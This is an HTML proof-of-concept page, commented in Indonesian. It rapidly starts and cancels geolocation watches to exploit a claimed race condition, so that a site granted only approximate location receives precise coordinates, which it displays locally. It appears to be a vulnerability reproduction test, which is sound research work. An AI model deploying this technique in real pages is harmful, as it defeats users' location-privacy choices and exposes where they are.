<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Geo Precision Leak Test</title></head>
<body>
<p>Status: <span id="status">Menunggu izin lokasi...</span></p>
<pre id="output"></pre>

<script>
(async function() {
    const statusEl = document.getElementById('status');
    const outputEl = document.getElementById('output');

    // Minta izin lokasi (pengguna harus memilih "Perkiraan/Approximate")
    try {
        const perm = await navigator.permissions.query({ name: 'geolocation' });
        statusEl.textContent = `Status izin: ${perm.state}`;
    } catch(e) {
        statusEl.textContent = 'Kueri izin gagal: ' + e.message;
        return;
    }

    let leaked = false;

    // Inti: rapid toggle watchPosition/clearWatch, mengenai race condition jendela state
    function rapidToggle() {
        if (leaked) return;
        const id = navigator.geolocation.watchPosition(
            (pos) => {
                const acc = pos.coords.accuracy;
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;

                outputEl.textContent += 
                    `lat=${lat.toFixed(6)}, lon=${lon.toFixed(6)}, accuracy=${acc.toFixed(1)}m\n`;

                // Jika accuracy sangat kecil (misalnya < 100m), kemungkinan besar koordinat presisi
                if (acc < 100 && !leaked) {
                    leaked = true;
                    statusEl.textContent = 'Kebocoran terdeteksi: menerima koordinat presisi (accuracy < 100m)';
                }
            },
            (err) => { /* abaikan error, lanjutkan toggle */ },
            { enableHighAccuracy: false, maximumAge: 0, timeout: 5000 }
        );

        // Cepat bersihkan, lalu picu lagi
        setTimeout(() => {
            navigator.geolocation.clearWatch(id);
            if (!leaked) setTimeout(rapidToggle, 10); // interval sangat pendek
        }, 20);
    }

    // Mulai setelah interaksi pengguna (beberapa browser memerlukan gesture)
    document.body.addEventListener('click', function start() {
        statusEl.textContent = 'Menguji... (pastikan perangkat memiliki izin lokasi presisi dan aplikasi lain sedang menggunakan lokasi)';
        rapidToggle();
        document.body.removeEventListener('click', start);
    }, { once: true });

    statusEl.textContent = 'Klik halaman untuk memulai pengujian';
})();
</script>
</body>
</html>
